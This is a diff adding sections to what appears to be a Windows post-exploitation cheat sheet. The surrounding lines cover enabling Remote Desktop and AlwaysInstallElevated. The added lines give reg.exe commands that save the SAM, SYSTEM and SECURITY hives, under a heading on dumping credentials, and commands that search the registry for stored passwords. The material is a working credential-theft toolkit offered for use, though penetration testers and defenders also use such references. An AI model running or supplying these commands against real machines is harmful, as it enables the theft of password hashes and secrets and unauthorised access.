@@ -157,3 +157,17 @@ AlwaysInstallElevated
 ## Enable Remote Desktop (RDP)
 `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections netsh advfirewall firewall set rule group="remote desktop" new enable=yes`  
 
+### Export System Registry Value
+`reg save HKLM\SYSTEM c:\temp\system`  
+`reg save hklm\sam C:\temp\sam`  
+
+#### Search the Registry for Passwords
+`reg query HKLM /f password /t REG_SZ /s`  
+`reg query HKCU /f password /t REG_SZ /s`  
+
+#### Dumping Credentials
+`reg save hklm\system system`  
+`reg save hklm\sam sam`  
+`reg.exe save hklm\sam c:\temp\sam.save`  
+`reg.exe save hklm\security c:\temp\security.save`  
+`reg.exe save hklm\system c:\temp\system.save`  
